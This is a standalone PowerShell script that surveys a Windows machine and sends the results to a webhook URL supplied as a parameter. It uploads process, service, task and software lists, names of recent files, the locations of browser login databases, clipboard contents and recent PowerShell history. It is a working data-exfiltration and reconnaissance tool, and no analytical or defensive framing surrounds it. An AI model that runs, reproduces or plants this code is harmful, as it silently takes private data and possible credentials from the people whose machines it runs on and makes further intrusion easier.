param($webhookUrl)

function Send-Data {
    param($title, $data)
    $body = "===== $title =====`r`n$data`r`n`r`n"
    Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $body -ContentType "text/plain" -UseBasicParsing
}

try {
    # 1. Running Processes
    $processes = Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 100 Name, Id, CPU, WorkingSet | Format-Table -AutoSize | Out-String
    Send-Data "RUNNING PROCESSES" $processes

    # 2. Running Services
    $services = Get-Service | Where-Object { $_.Status -eq "Running" } | Select-Object -First 50 Name, DisplayName | Format-Table -AutoSize | Out-String
    Send-Data "RUNNING SERVICES" $services

    # 3. Scheduled Tasks
    $tasks = Get-ScheduledTask | Where-Object { $_.State -ne "Disabled" } | Select-Object -First 30 TaskName, State | Format-Table -AutoSize | Out-String
    Send-Data "SCHEDULED TASKS" $tasks

    # 4. Installed Programs
    $programs = @()
    $programs += Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName }
    $programs += Get-ItemProperty HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName }
    $programs += Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName }
    $programsList = $programs | Select-Object DisplayName, DisplayVersion, Publisher | Sort-Object DisplayName | Format-Table -AutoSize | Out-String
    Send-Data "INSTALLED PROGRAMS" $programsList

    # 5. Startup Programs
    $startupItems = @()
    $startupItems += Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
    $startupItems += Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
    $startupItemsList = $startupItems | Format-List | Out-String
    Send-Data "STARTUP PROGRAMS" $startupItemsList

    # 6. Tasklist
    $tasklist = tasklist /v | Out-String
    Send-Data "TASKLIST" $tasklist

    # 7. Recent Files
    $recentFiles = @()
    $recentFiles += Get-ChildItem "$env:USERPROFILE\Desktop" -File -ErrorAction SilentlyContinue | Select-Object -First 20 Name, Length, LastWriteTime
    $recentFiles += Get-ChildItem "$env:USERPROFILE\Documents" -File -ErrorAction SilentlyContinue | Select-Object -First 20 Name, Length, LastWriteTime
    $recentFiles += Get-ChildItem "$env:USERPROFILE\Downloads" -File -ErrorAction SilentlyContinue | Select-Object -First 20 Name, Length, LastWriteTime
    $recentFilesList = $recentFiles | Select-Object -First 50 | Format-Table -AutoSize | Out-String
    Send-Data "RECENT FILES" $recentFilesList

    # 8. Browser Profiles
    $browserPaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
        "$env:APPDATA\Mozilla\Firefox\Profiles"
    )
    $foundBrowsers = $browserPaths | Where-Object { Test-Path $_ } | ForEach-Object { $_ }
    Send-Data "BROWSER PROFILES" ($foundBrowsers -join "`r`n")

    # 9. Clipboard
    try {
        $clipboard = Get-Clipboard
        if($clipboard) { Send-Data "CLIPBOARD CONTENT" $clipboard }
    } catch {}

    # 10. PowerShell History
    $psHistory = Get-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue | Select-Object -Last 50 | Out-String
    if($psHistory) { Send-Data "POWERSHELL HISTORY" $psHistory }

} catch {
    Send-Data "ERROR" $_.Exception.Message
}
